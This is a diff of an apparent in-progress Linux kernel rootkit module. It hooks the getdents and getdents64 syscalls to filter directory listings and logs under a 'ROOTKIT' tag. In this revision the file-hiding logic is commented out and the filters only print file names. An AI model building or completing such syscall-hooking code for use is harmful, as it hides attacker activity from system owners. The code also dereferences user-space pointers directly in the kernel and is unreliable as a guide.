@@ -14,9 +14,9 @@ pte_t *pte;
 
 struct linux_dirent {
 	unsigned long  d_ino;     /* Inode number */
-	off_t          d_off;     /* Offset to next linux_dirent */
+	unsigned long  d_off;     /* Offset to next linux_dirent */
 	unsigned short d_reclen;  /* Length of this linux_dirent */
-	char           d_name[];  /* Filename (null-terminated) */
+	char           d_name[];  /* Filename (null-terminated)  */
 			    /* length is actually (d_reclen - 2 -
 			      offsetof(struct linux_dirent, d_name) */
 	/*
@@ -26,10 +26,10 @@ struct linux_dirent {
 	*/
 };
 
-static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent));
-static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pred)(struct linux_dirent64));
-static inline int filter_fn(struct linux_dirent d);
-static inline int filter_fn64(struct linux_dirent64 d);
+static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent __user *));
+static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pred)(struct linux_dirent64 __user *));
+static inline int filter_fn(struct linux_dirent __user *d);
+static inline int filter_fn64(struct linux_dirent64 __user *d);
 
 asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage int (*real_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
@@ -54,20 +54,16 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 __user *dir
 	return filter_out64(dirp, length, &filter_fn64);
 }
 
-static inline int filter_out(struct linux_dirent __user *dirp, int length, int (*pred)(struct linux_dirent)) {
+static inline int filter_out(struct linux_dirent __user *dirp, int length, int (*pred)(struct linux_dirent __user *)) {
 	int index = 0;
 	int index_copyto = -1;
 	unsigned short reclen;
-	struct linux_dirent d;
+	struct linux_dirent *d;
 	// Why ints? Because getdents[64] returns an int.
 	
 	while (index < length) {
-		d = *(dirp+index);
-		reclen = d.d_reclen;
-		
-		pr_info("%8ld  ", d.d_ino);
-		pr_info("%4d %10lld  %s", d.d_reclen,
-			(long long) d.d_off, d.d_name);
+		d = (dirp+index);
+		reclen = d->d_reclen;
 		
 		if (reclen <= 0) {
 			pr_info("ROOTKIT reclen was 0 (CRITICAL ERROR THIS SHOULD NEVER HAPPEN)");
@@ -85,19 +81,19 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 			index_copyto += reclen;
 		}*/
 		
-		index += d.d_reclen;
+		index += reclen;
 	}
 	
 	return length;
 }
 
-static inline int filter_out64(struct linux_dirent64 __user *dirp, int length, int (*pred)(struct linux_dirent64)) {
+static inline int filter_out64(struct linux_dirent64 __user *dirp, int length, int (*pred)(struct linux_dirent64 __user *)) {
 	int index = 0;
 	int index_copyto = -1;
 	unsigned short reclen;
-	struct linux_dirent64 d;
+	struct linux_dirent64 *d;
 	// Why ints? Because getdents[64] returns an int.
-	pred(*dirp);
+	pred(dirp);
 	
 	/*while (index < length) {
 		d = *(dirp+index);
@@ -120,14 +116,14 @@ static inline int filter_out64(struct linux_dirent64 __user *dirp, int length, i
 	return length;
 }
 
-static inline int filter_fn(struct linux_dirent d) {
-	pr_info("%s", d.d_name);
+static inline int filter_fn(struct linux_dirent __user *d) {
+	pr_info("%s", d->d_name);
 	
 	return 0;
 }
 
-static inline int filter_fn64(struct linux_dirent64 d) {
-	pr_info("%s", d.d_name);
+static inline int filter_fn64(struct linux_dirent64 __user *d) {
+	pr_info("%s", d->d_name);
 	
 	return 0;
 }
